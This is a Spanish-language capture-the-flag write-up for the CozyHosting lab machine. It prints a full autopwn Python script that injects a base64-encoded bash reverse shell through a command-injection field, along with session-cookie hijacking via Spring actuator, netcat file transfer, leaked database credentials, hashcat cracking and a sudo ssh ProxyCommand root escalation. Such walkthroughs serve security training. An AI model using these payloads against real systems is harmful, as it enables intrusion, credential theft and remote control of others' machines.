
# CozyHosting

## <mark style="color:purple;">Primer acceso</mark>

Accedemos a la IP 10.10.11.230 a través del navegador. Está bloqueado, a si que añadimos el host a nuestro /etc/hosts:

```
sudo nano /etc/hosts
```

Ahora ya se muestra la web en el navegador:

<figure><img src="/files/q28RXJ16tRK7H8cV3odi" alt=""><figcaption></figcaption></figure>

A primera vista parece una web con servicios de hosting. No tiene ninguna acción aparte del botón de login. En el código fuente no encontramos ningún dato relevante.

## <mark style="color:purple;">Escaneo con Nmap</mark>

NMAP Puertos abiertos:&#x20;

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
|_http-favicon: Unknown favicon MD5: 72A61F8058A9468D57C3017158769B1F
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
```

## <mark style="color:purple;">Fuzzing</mark>

Al fuzzear con gobuster o ffuf no encontramos ningún directorio interesante, así que vamos a probar a hacer fuzzing con dirsearch

```
dirsearch -u http://cozyhosting.htb/
```

Nos devuelve:

<figure><img src="/files/gEjftuU0uKmOQmHdXoDJ" alt=""><figcaption></figcaption></figure>

* Hay un directorio sospechoso: `/actuator`
* Al acceder al directorio nos encontramos varios apartados:

<figure><img src="/files/Q3rASFpUckpWnKBSOIyG" alt=""><figcaption></figcaption></figure>

* Al acceder a /actuator/sessions tenemos un nombre de usuario '*<mark style="color:purple;">kanderson</mark>*' y <mark style="color:purple;">cookies de sesión</mark> asociadas:

<figure><img src="/files/DZfXQj3XsEvx2TTobB1L" alt=""><figcaption></figcaption></figure>

Desde el navegador cambiamos la cookie de sesión en inspect/storage, y accedemos sin usuario ni contraseña a /admin.

<figure><img src="/files/IfZyOZ0HmJ45DZlRRhiT" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/mfmJoohSMeHWdXY3WCuV" alt=""><figcaption></figcaption></figure>

En este panel no hay muchas cosas interesantes o que podamos hacer.

## <mark style="color:purple;">Exploit</mark>

Buscando en internet encontramos un exploit para esta máquina:&#x20;

{% embed url="<https://breachforums.is/Thread-Cozy-Hosting-AutoPwn-Script?pid=141786#pid141786>" %}

Creamos un archivo cozy.py con el siguiente script:

{% code overflow="wrap" %}

```python
#!/usr/bin/python3
# Author: M3Y
# IMPORTS #
import requests
import json
import sys
import subprocess

# Config Target
URL = "http://cozyhosting.htb"
headers = {'Content-Type':'application/vnd.spring-boot.actuator.v3+json'}

# lhost - lport
if len(sys.argv) != 3:
    print('[!] Usage: %s host port' % (sys.argv[0]))
    print('[*]Example: ./cozy.py 10.10.12.14 443\n')

lhost = sys.argv[1]
lport = sys.argv[2]

# create payload
# 1) encode in base64
proc=subprocess.Popen([f"echo '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' | base64"],stdout=subprocess.PIPE,shell=True)
out, _ = proc.communicate()
result = out.decode().strip()

# 2) generate shell payload
payload=";$(echo${IFS}%s${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}/bin/bash${IFS})" % (result)

def getAdminDashboard():
    # url for get session
    session_url = URL + "/actuator/sessions"
    r = requests.get(session_url,headers=headers)
    data = r.json()

    # loop on each value
    desired_value = 'kanderson'
    key = None

    for k,v in data.items():
        if v == desired_value:
          key = k
          break
    return key

def getShell():
    session = getAdminDashboard()

    new_url = URL + "/executessh"

    # Cookie to access at dashboard
    cookies = {'JSESSIONID': 'Confusedession'}

    # payload data
    data = {'host': '127.0.0.1',
            'username': payload
    }

    request = requests.post(new_url,cookies=cookies,data=data)

if __name__ == "__main__":
    print('[!] Befote execute this script start a listener with netcat')
    print('[*]Example: nc -nlvp 443')
    print('[*]Getting Shell ...')
    getShell()
```

{% endcode %}

Abrimos un listener de netcat y ejecutamos cozy.py, dándole como argumentos la IP y el puerto de netcat:&#x20;

```
nc -nlvp 1337
```

```
python3 cozy.py 10.10.14.202 1337
```

Esto nos devuelve una shell a netcat.&#x20;

<figure><img src="/files/yrGOMfinKriHe871iwiw" alt=""><figcaption></figcaption></figure>

Al acceder al directorio home nos encontramos el nombre de usuario '*<mark style="color:purple;">josh</mark>*', pero no nos deja acceder.

<figure><img src="/files/LbWcccCXug6jHCVVMM2o" alt=""><figcaption></figcaption></figure>

En el directorio principal hay un archivo .jar que vamos a descargar por netcat:

* En el server: `nc 10.10.14.202 1234 < cloudhosting-0.0.1.jar`
* En nuestro kali: `nc -l -p 1234 > cloudhosting-0.0.1.jar`

Descomprimimos el zip o lo abrimos con JDec

{% embed url="<https://jdec.app>" %}

En el archivo *`application.properties`* encontramos el usuario y contraseña de la base de datos:&#x20;

<figure><img src="/files/mq5vinJZE3ok4sX69mII" alt=""><figcaption></figcaption></figure>

```
Usuario: postgres
Contraseña: Vg&nvzAQ7XxR
```

Nos conectamos a la base de datos desde la shell del server:&#x20;

```
psql -U postgres -W -h localhost -d cozyhosting
```

Ya estamos dentro de la base de datos. Vamos a enumerar las bases de datos disponibles y su información en busca de usuarios y contraseñas:

```html
\list                 <!-- listado de bases de datos -->
\c cozyhosting        <!-- Accedemos a la BBDD cozyhosting -->
\d                    <!-- Muestra todas las relaciones -->
SELECT * FROM users;  <!-- Vemos todo el contenido de la tabla usuarios -->
```

<figure><img src="/files/CU0Kojp9yMnuBPiwlJm0" alt=""><figcaption></figcaption></figure>

Encontramos usuarios y contraseñas en formato hash:

```
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

## <mark style="color:purple;">Cracking</mark>

Vamos a crackear los hashes para obtener las contraseñas en plano:

```
sudo hashcat -m 3200 -a 0 admin.hash /usr/share/wordlists/rockyou.txt
```

La contraseña es: `manchesterunited`

Nos conectamos por SSH con el usuario *<mark style="color:purple;">josh</mark>* (que encontramos antes) y esta contraseña:

```
ssh josh@10.10.11.230
manchesterunited
```

<figure><img src="/files/pHPrfp2l0SqD0VUiU2mQ" alt=""><figcaption></figcaption></figure>

Obtenemos el user.txt:&#x20;

```
3c1561e5ac2f02a012402d308e....
```

## <mark style="color:purple;">Escalada de privilegios</mark>

#### Vamos a ver los permisos que tenemos en la máquina:

```
sudo -l
User josh may run the following commands on localhost: (root) /usr/bin/ssh *
```

#### Consultamos GTFOBins para ver los binarios disponibles:&#x20;

{% embed url="<https://gtfobins.github.io/gtfobins/ssh/>" %}

* Encontramos una shell interactiva a través de ProxyCommand.

#### Nos movemos al directorio /usr/bin:

```
cd /usr/bin
```

* Ejecutamos lo siguiente:&#x20;

```
ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

* Seguido de:&#x20;

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

## <mark style="color:purple;">Ya somos root</mark> 😎

<figure><img src="/files/tQryd9KrXunKZge6ZyuU" alt=""><figcaption></figcaption></figure>

Obtenemos el root.txt:&#x20;

```
1846899fa46fb3bca2444eb60be7....
```
